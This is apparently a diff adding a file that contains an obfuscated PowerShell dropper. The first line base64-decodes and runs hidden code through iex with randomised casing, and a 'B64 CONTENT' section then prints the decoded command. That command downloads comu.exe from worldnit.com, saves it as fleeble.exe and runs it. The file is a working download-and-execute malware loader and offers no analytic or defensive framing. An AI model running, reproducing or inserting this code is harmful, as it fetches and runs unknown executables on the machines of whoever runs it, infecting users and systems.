@@ -1,0 +1,7 @@
+iex([SYStem.TExt.ENCOdING]::utF8.geTSTrING([sYstEM.cOnvErT]::frOMBasE64strINg('CihOZXctT2JqZWN0IHN5U1RFbS5OZVQuV0VCQ2xJRU5UKS5kb3dObG9BRGZpbGUoJ2h0dHA6Ly93b3JsZG5pdC5jb20vY29tdS5leGUnLCdmbGVlYmxlLmV4ZScpO1N0YXJ0LVByb2Nlc3MgJ2ZsZWVibGUuZXhlJwoK')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object sySTEm.NeT.WEBClIENT).dowNloADfile('http://worldnit.com/comu.exe','fleeble.exe');Start-Process 'fleeble.exe'
+
